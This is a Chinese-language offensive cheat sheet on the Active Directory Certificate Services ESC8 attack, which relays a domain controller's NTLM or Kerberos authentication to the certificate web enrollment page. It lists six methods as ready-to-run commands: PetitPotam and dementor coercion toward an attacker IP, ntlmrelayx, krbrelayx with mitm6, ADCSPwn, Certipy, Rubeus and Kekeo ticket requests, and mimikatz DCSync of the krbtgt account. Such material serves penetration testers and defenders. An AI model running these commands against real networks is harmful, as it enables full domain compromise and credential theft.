# Active Directory - 证书 ESC8

## ESC8 - Web 注册中继

> 攻击者可以使用 PetitPotam 触发域控制器将 NTLM 凭据中继到指定主机。然后将域控制器的 NTLM 凭据中继到 Active Directory 证书服务（AD CS）的 Web 注册页面，从而注册一个域控证书。该证书随后可用于请求 TGT（票据授予票据），并通过票据传递攻击接管整个域。

需要 [SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket/pull/1101) PR #1101

* **方法 1**：NTLM 中继 + Rubeus + PetitPotam

  ```powershell
  impacket> python3 ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs
  impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template VulnTemplate
  # 对于成员服务器或工作站，模板应使用 "Computer"
  # 其他模板：workstation、DomainController、Machine、KerberosAuthentication

  # 通过 MS-ESFRPC 的 EfsRpcOpenFileRaw 函数使用 PetitPotam 强制认证
  # 也可以使用其他方式强制认证，如通过 MS-RPRN 的 PrintSpooler
  git clone https://github.com/topotam/PetitPotam
  python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
  python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
  python3 dementor.py <listener> <target> -u <username> -p <password> -d <domain>
  python3 dementor.py 10.10.10.250 10.10.10.10 -u user1 -p Password1 -d lab.local

  # 使用证书通过 Rubeus 请求 TGT
  Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt
  Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt

  # 现在可以使用 TGT 执行 DCSync
  mimikatz> lsadump::dcsync /user:krbtgt
  ```

* **方法 2**：NTLM 中继 + Mimikatz + Kekeo

  ```powershell
  impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

  # Mimikatz
  mimikatz> misc::efs /server:dc.lab.local /connect:<IP> /noauth

  # Kekeo
  kekeo> base64 /input:on
  kekeo> tgt::ask /pfx:<BASE64-CERT-FROM-NTLMRELAY> /user:dc$ /domain:lab.local /ptt

  # Mimikatz
  mimikatz> lsadump::dcsync /user:krbtgt
  ```

* **方法 3**：Kerberos 中继

  ```ps1
  # 设置中继
  sudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.domain.local --adcs --template Machine

  # 运行 mitm6
  sudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v
  ```

* **方法 4**：ADCSPwn - 需要域控制器上运行 `WebClient` 服务。默认情况下此服务未安装。

  ```powershell
  https://github.com/bats3c/ADCSPwn
  adcspwn.exe --adcs <cs server> --port [local port] --remote [computer]
  adcspwn.exe --adcs cs.pwnlab.local
  adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001
  adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\Temp\cert_b64.txt
  adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\mranderson --password The0nly0ne! --dc dc.pwnlab.local

  # ADCSPwn 参数
  adcs            -       AD CS 服务器地址，身份认证将被中继到此处。
  secure          -       使用 HTTPS 连接证书服务。
  port            -       ADCSPwn 监听的端口。
  remote          -       要触发身份认证的远程机器。
  username        -       非域上下文的用户名。
  password        -       非域上下文的密码。
  dc              -       用于查询证书模板（LDAP）的域控制器。
  unc             -       EfsRpcOpenFileRaw（PetitPotam）的自定义 UNC 回调路径。
  output          -       存储 base64 生成的证书的输出路径。
  ```

* **方法 5**：Certipy ESC8

  ```ps1
  certipy relay -ca 172.16.19.100
  ```

* **方法 6**：Kerberos 中继（仅有一台 DC 时的自我中继）

  ```ps1
  # 使用 James Forshaw 的技巧添加 DNS 条目
  dnstool.py -u "domain.local\user" -p "password" -r "computer1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" -d "10.10.10.10" --action add "10.10.10.11" --tcp

  # 在 DNS 条目上使用 PetitPotam 强制 Kerberos 认证
  petitpotam.py -u 'user' -p 'password' -d domain.local 'computer1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' computer.domain.local

  # 中继 Kerberos
  python3 krbrelayx.py -t 'http://computer.domain.local/certsrv/certfnsh.asp' --adcs --template DomainController -v 'COMPUTER$' -ip 10.10.10.10
  ```

## 参考资料

* [NTLM relaying to AD CS - On certificates, printers and a little hippo - Dirk-jan Mollema](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
* [AD CS relay attack - practical guide - @exandroiddev - June 23, 2021](https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/)
